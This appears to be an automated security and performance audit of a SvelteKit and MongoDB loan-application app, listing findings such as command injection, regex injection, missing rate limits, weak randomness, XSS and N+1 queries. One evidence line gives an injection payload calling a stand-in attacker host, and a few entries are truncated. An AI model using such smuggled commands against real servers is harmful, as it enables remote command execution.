issue: OS command injection via unsanitized `pattern` parameter passed directly into shell command
evidence: const cmd = pattern ? `npx vitest run --reporter=json "${pattern}"` : 'npx vitest run --reporter=json'; — a pattern like `" && curl attacker.com` escapes the double-quote context
impact: Arbitrary command execution on the server. Blocked by `if (!dev) throw error(404)` so only exploitable in dev, but any developer running the app with external access is at risk.

issue: MongoDB ReDoS / regex injection: user-supplied `q` search parameter passed directly into `$regex` without escaping
evidence: { name: { $regex: search, $options: 'i' } } — `search` is the raw `url.searchParams.get('q')` value. The sibling endpoint `admin/users/rm` correctly uses `escapeRegex(search)` but this one does not.
impact: A crafted regex (e.g., `(a+)+$`) can cause catastrophic backtracking in MongoDB, leading to denial of service for admin queries. Also allows partial regex injection.

issue: JWT access token accepted via URL query parameter, leaking the token into server logs, proxy logs, browser history, and Referer headers
evidence: let token = url.searchParams.get('token'); — the GET endpoint reads the JWT from the `token` URL query parameter and validates it against the database
impact: Token exposure in server access logs, browser history, CDN/proxy logs, and Referer headers when the URL is shared. Enables session hijacking if logs are compromised.

issue: Unvalidated user-supplied data inserted directly into MongoDB collection
evidence: const data = parsed.data; const result = await AppliedApplications.insertOne(data); — `data` is the raw parsed JSON body (`Record<string, any>`) with no schema validation before insert
impact: Attacker can insert arbitrary fields, potentially including MongoDB operator keys (`$set`, `$where`) if the driver processes them, and pollute the collection with any data structure.

issue: No rate limiting on account restore endpoint allows mobile number enumeration and brute-force discovery of deleted accounts
evidence: No `rateLimit()` call in the handler. The endpoint accepts any mobileNumber and reveals whether a deleted account exists for it via different error messages.
impact: Attacker can enumerate all deleted DSA mobile numbers to discover former users, or repeatedly attempt restore to probe account existence.

issue: No rate limiting on email availability check endpoint enables user enumeration at scale
evidence: No `rateLimit()` call; endpoint returns distinct responses `{ exists: true }` or `{ exists: false }` for any email.
impact: Attackers can enumerate all registered DSA/user email addresses without any throttling, facilitating targeted phishing and credential stuffing.

issue: No rate limiting on public newsletter subscription endpoint enables email list probing and spam abuse
evidence: No `rateLimit()` call anywhere in the handler. Public endpoint, no authentication required.
impact: Attacker can probe whether arbitrary email addresses are subscribed, or flood the endpoint to pollute the subscription database.

issue: No rate limiting on public share-link validation endpoint enables token brute-forcing
evidence: No `rateLimit()` call in the handler. The endpoint is unauthenticated and increments useCount on every valid token.
impact: Attacker can brute-force share link tokens to discover valid links and access applicant data forms without authorization.

issue: Insecure randomness used to generate session tokens in fallback path: `Math.random()` is not cryptographically secure
evidence: serverToken = `local_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`; serverRefreshToken = `refresh_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
impact: Fallback tokens generated with predictable entropy. An attacker who can observe timing can predict these tokens, enabling session fixation attacks.

issue: Insecure randomness used to generate request tracking ID with `Math.random()`
evidence: const requestId = `req_${Math.random().toString(36).substring(2, 12)}_${Date.now()}`;
impact: Request IDs are meant to be unpredictable for tracing/correlation; using Math.random() means IDs can be predicted.

issue: Insecure randomness used to generate request tracking ID with `Math.random()`
evidence: const requestId = `req_${Math.random().toString(36).substring(2, 12)}_${now}`;
impact: Low severity; tracking IDs are non-security-critical, but consistent use of crypto.randomUUID() is a best practice.

issue: Unsanitized `question.description` rendered with `{@html}` without DOMPurify sanitization
evidence: {@html question.description} — while most other `{@html}` uses import `sanitizeHtml`, this instance renders the description field directly
impact: If `question.description` ever receives dynamic content, stored XSS is possible. Currently mitigated by descriptions being static config.

issue: The `sanitizeHtml` in `sanitize.ts` uses regex-based HTML sanitization instead of DOMPurify, with known bypass patterns
evidence: Removes `
impact: Any component importing from `$lib/utils/sanitize` (not `$lib/utils/sanitizeHtml`) and rendering with `{@html}` is vulnerable to XSS.

issue: CSRF token cookie set on every GET request with stateless HMAC — race condition risk with parallel requests
evidence: event.cookies.set('csrf-token', csrfToken, { httpOnly: false, ... }) — new token generated on every GET, old cookie immediately invalidated.
impact: Race conditions in multi-tab or concurrent-request scenarios may cause legitimate CSRF token rejections.

issue: CSRF validation is entirely skipped in development mode (`if (dev) return true`)
evidence: function validateCSRF(event): boolean { if (dev) { return true; } ... } — combined with csrfSecret fallback to empty string
impact: Development environments accessible via ngrok, tunnels, or staging deployments have zero CSRF protection.

issue: Active role resolved from unvalidated `activeRole` cookie — user can switch to any role string by modifying cookie
evidence: const activeRoleCookie = event.cookies.get('activeRole'); — cookie is not httpOnly and not validated against user's actual allowed roles
impact: A standard user could set `activeRole=admin` in their browser cookie. Routes trusting `locals.role` without verifying `locals.user.roles.admin === true` can be bypassed.

issue: User-controlled `name` and `roleLabel` inserted into email subject and HTML body without sanitization
evidence: subject: `Account Deleted — ${name} (${roleLabel})` and `${name}` where `name` comes from user registration input
impact: A user who registered with a name containing `\r\n` sequences could inject additional email headers or HTML.

issue: No rate limiting on role detection endpoint enables mobile number enumeration of all registered users
evidence: No `rateLimit()` call in the handler. Returns `{ hasAnyProfile: true/false, roles: [...] }` for any mobile number.
impact: Attacker can enumerate all registered mobile numbers to identify DSA/RM users for targeted attacks.

issue: Prototype pollution protection not applied at API input boundaries — most routes use `parseJsonBody` which returns raw `JSON.parse()` output
evidence: securedClone strips dangerous keys but `parseJsonBody` returns raw output. Routes like `/api/appliedApplication` call insertOne(data) with the raw body.
impact: Application code that uses `in` operator or property access on the inserted object could be affected by prototype pollution.

issue: Insecure randomness used to generate document IDs with `Math.random()` — only 4 characters of base36 random
evidence: const document_id = `DOC-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`;
impact: Document IDs can be predicted or brute-forced, enabling attacker to enumerate document IDs for other users.

issue: Security event and alert IDs generated with `Math.random()` rather than cryptographically secure randomness
evidence: return `evt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
impact: Security event IDs are predictable, allowing an attacker who knows the approximate time to enumerate/forge security event references.

issue: CSP `img-src 'self' data: https:` permits loading images from any HTTPS source
evidence: img-src 'self' data: https: — the `https:` wildcard allows images from any HTTPS origin
impact: XSS payloads can exfiltrate data via image-load side channels even when script execution is blocked.

issue: CSP nonce injection only handles bare `<script>` tags, not `<script type="module">` or other variations
evidence: html.replace(/<script>/g, `<script nonce="${cspNonce}">`) — only matches literal `<script>` without attributes
impact: Legitimate SvelteKit module scripts may be blocked by CSP, causing application breakage.

issue: Auth cookies set using `import.meta.env.PROD` instead of SvelteKit's `dev` import — may disagree in some build configurations
evidence: const isProd = import.meta.env.PROD; ... secure: isProd — while hooks.server.ts uses `import { dev } from '$app/environment'`
impact: Cookies may be set without the `Secure` flag in production if the values resolve differently.

issue: MongoDB `$regex` query with unescaped user input is a ReDoS vector even for admin-only access
evidence: { name: { $regex: search, $options: 'i' } } with raw `search` from URL query parameter
impact: Compromised admin account could submit catastrophic regex causing MongoDB CPU spike and denial of service.

issue: Server-provided `pageDescription` rendered with `{@html}` without any sanitization
evidence: {@html serverPage?.pageDescription || ''} — no DOMPurify sanitization applied
impact: If `pageDescription` becomes dynamic, stored XSS is introduced with no sanitization barrier.

issue: Server-provided `pageDescription` rendered with `{@html}` without any sanitization in LAP form page
evidence: {@html serverPage?.pageDescription || ''} — same pattern as SEC-026, present in LAP, plot-loan, and home-loan form pages
impact: Same as SEC-026 — no immediate risk from static config, but no defense-in-depth.

issue: N+1 query: sequential DsaApplications.findOne inside loop over all users with unread notifications
evidence: for (const userGroup of unreadByUser) { const dsaDoc = await DsaApplications.findOne(...) }
impact: For N users with unread notifications, N+1 MongoDB queries fired sequentially.

issue: N+1 query cascade: sequential Lenders.findOne + PolicyRules.findOne + LenderProducts.updateOne per artifact per loan type
evidence: for (const artifact of artifacts) { const lender = await Lenders.findOne(...); for (const loanType of ...) { ... await PolicyRules.findOne(...); await LenderProducts.updateOne(...) } }
impact: Migration function scales as O(artifacts × loanTypes) sequential DB round-trips.

issue: Sequential file uploads to ImageKit inside for-loop instead of parallel Promise.all
evidence: for (const file of files) { ... const result = await imagekit.files.upload({...}) }
impact: Uploading 3 policy PDFs takes 3× the network latency of a single upload.

issue: Per-lender variationMatcher queries ProductVariations collection without cache — N queries for N lenders
evidence: evaluations.map(async (ev) => { const dbPolicies = await resolvePoliciesForLender(ev.lender_id, ...) })
impact: At 10 active lenders, 10 separate DB lookups per evaluation run; variationMatcher has no cache.

issue: Sequential waterfall of 4 findOne queries on every request when access token has expired
evidence: const userDoc = await Applicant.findOne(...); if (!userDoc) { const dsaDoc = await DsaApplications.findOne(...); ... }
impact: Every page load with expired access token performs 1–4 sequential DB round-trips before any real work starts.

issue: Same sequential 4-collection waterfall repeated in main token verification path
evidence: const userDoc = await Applicant.findOne(...); if (!userDoc) { const dsaDoc = await DsaApplications.findOne(...); ... }
impact: Every authenticated request pays 2–4 sequential DB round-trips at hook level.

issue: 2 sequential uncached DB queries on every invocation: SystemConfigs.findOne then DsaApplications.findOne
evidence: const systemConfig = await SystemConfigs.findOne({ config_key: featureKey }); ... const dsaDoc = await DsaApplications.findOne(...)
impact: isFeatureEnabled called on every case page load; system configs never change but are never cached.

issue: 3-hop sequential query chain: ReraProjects → ReraProjectCompanies → ReraCompanies on every builder dropdown load
evidence: const projects = await ReraProjects.find(...).toArray(); ... const links = await ReraProjectCompanies.find(...).toArray(); ... const companies = await ReraCompanies.find(...).toArray()
impact: Builder dropdown requires 3 sequential MongoDB round-trips on every form page render.

issue: Identical 3-hop sequential query chain for state-level fallback with no caching
evidence: const projects = await ReraProjects.find({ state: reraState }).toArray(); ...
impact: Delhi fallback path performs 3 sequential queries; called on every form render for home-loan/LAP/plot with Delhi property.

issue: 3-hop sequential query chain for project dropdown with potential 2nd fallback query
evidence: const company = await ReraCompanies.findOne(...); const links = await ReraProjectCompanies.find(...).toArray(); let projects = await ReraProjects.find(...).toArray(); if (projects.length === 0) { projects = await ReraProjects.find(...) }
impact: 4 sequential queries possible on builder-selected project dropdown; no result caching.

issue: Missing MongoDB index on NbfcNegativeAreas.lender_id — queried with $in on every evaluation run
evidence: NbfcNegativeAreas.find({ lender_id: { $in: lenderIds } }) in evaluationEngine.ts; no createIndex for NbfcNegativeAreas in ensureIndexes()
impact: Full collection scan on NbfcNegativeAreas for every loan evaluation.

issue: Missing index on DsaApplications subscription.status + subscription.expires_at — queried by billing cron
evidence: DsaApplications.find({ 'subscription.status': 'trial', 'subscription.expires_at': { $lte: ... } }) in billing/trial-reminder/+server.ts
impact: Full DsaApplications collection scan on every billing cron run.

issue: Notifications digest aggregation matches on {read: false} without user_id filter first — suboptimal index usage
evidence: Notifications.aggregate([{ $match: { read: false } }]) in digest/+server.ts; index is user_id + read + created_at
impact: Digest cron scans all unread notifications without a user_id filter first.

issue: Loads ALL non-archived cases from MongoDB into server memory for client-side filtering and pagination
evidence: const allCases = await Cases.find({ dsa_id: dsaId, is_archived: { $in: [false, null] } }).sort({ updated_at: -1 }).toArray() — then filters/paginates in JS
impact: A DSA with 500 cases transfers all 500 documents and filters in Node.js; pagination should use $skip/$limit.

issue: Loads ALL cases for DSA (no limit) to compute dashboard stats in memory
evidence: Cases.find({ dsa_id: dsaId }, { projection: {...} }).toArray() — no limit; multiple nested for loops
impact: DSAs with many cases pay full transfer cost on every dashboard load; could use MongoDB aggregation.

issue: N parallel RMContacts queries for N lenders — could be a single $in query
evidence: await Promise.all(lenderNames.map(async (lenderName) => { const contacts = await RMContacts.find({ lender_name: lenderName }).limit(3).toArray() }))
impact: For a case with 15 lenders, 15 simultaneous queries; could be single $in query + grouping.

issue: Sequential sendEmail calls inside for-loop for trial and subscription reminders
evidence: for (const dsa of trialExpiring) { await sendEmail({...}) } ... for (const dsa of subscriptionExpiring) { await sendEmail({...}) }
impact: Sending 100 reminders takes 100× email latency in sequence; should use Promise.allSettled.

issue: MediaQueryList change listener added without cleanup in onDestroy — potential memory leak
evidence: mql.addEventListener('change', (e) => { isMobile = e.matches; }) — added in onMount; onDestroy never calls mql.removeEventListener
impact: Each mount leaks a MediaQueryList event handler; on SPA navigation the old handler persists.

issue: 3,094-line monolithic form component — impossible to code-split, high parse + compile cost
evidence: 3094 lines; imports 30+ utilities, 2 large manager classes, all question components statically
impact: Browser must parse entire 3,094-line module on first navigation; no dynamic imports for rarely-used sections.

issue: 2,888-line orchestrator file with 10 $effect blocks — each re-runs on any reactive dependency change
evidence: 10 $effect() calls; many depend on formState.applicants which changes on every field edit
impact: Adding one character to an applicant field triggers up to 10 effect re-evaluations.

issue: 2,004-line component with 7 $effect blocks operating on income profile state
evidence: 7 $effect blocks; several $derived chains involving .map()/.filter() on applicants array
impact: Every income profile change triggers multiple derived recomputations across all applicants.

issue: Triple-nested for-loops re-executed on every wizard state change without memoization
evidence: for (section → subsection → pageIds) pattern repeated at 11+ locations
impact: Every form field change triggers full wizard progress recomputation across all sections/pages; for home loan with ~116 pages.

issue: pollIntervals map has no cleanup on component destroy — setInterval instances leak on navigation
evidence: let pollIntervals = $state<Record<string, ReturnType<typeof setInterval> | null>>({}); no global cleanup in onDestroy
impact: Navigating away while polling continues fetch requests indefinitely.

issue: LenderRuleFixtures.find({}) and SyntheticProfiles.find({}) load all records without limit or projection
evidence: const fixturesRaw = await LenderRuleFixtures.find({}).sort({ fixture_id: 1 }).toArray(); const syntheticsRaw = await SyntheticProfiles.find({}).toArray()
impact: Growing datasets transferred in full on every admin testing page load.

issue: Same unbounded LenderRuleFixtures.find({}) and SyntheticProfiles.find({}) on e2e-run page
evidence: Duplicate of PERF-024 on second admin page
impact: Both admin pages load full fixture/synthetic datasets on every visit.

issue: 4 separate queries for version enrichment — could be single $lookup aggregation
evidence: const vRules = await PolicyRules.find(...).toArray(); const [vLenders, vProducts, vVariations] = await Promise.all([...]);
impact: RM dashboard version enrichment adds latency on every load.

issue: SystemConfigs.find({}) loads all system configs without caching on every admin settings page load
evidence: SystemConfigs.find({}).sort({ group: 1, config_key: 1 }).toArray() — called again in POST action too

evidence: const { calculateAffordability } = await import('./affordabilityCalculator.js'); const { selectBestPlApplicant } = await import('./plApplicantSelector.js');

issue: Two separate sequential DB queries (DsaApplications.findOne then Cases.findOne) instead of parallel Promise.all
evidence: const dsaDoc = await DsaApplications.findOne(...); ... const caseDoc = await Cases.findOne(...); — sequential, neither depends on the other
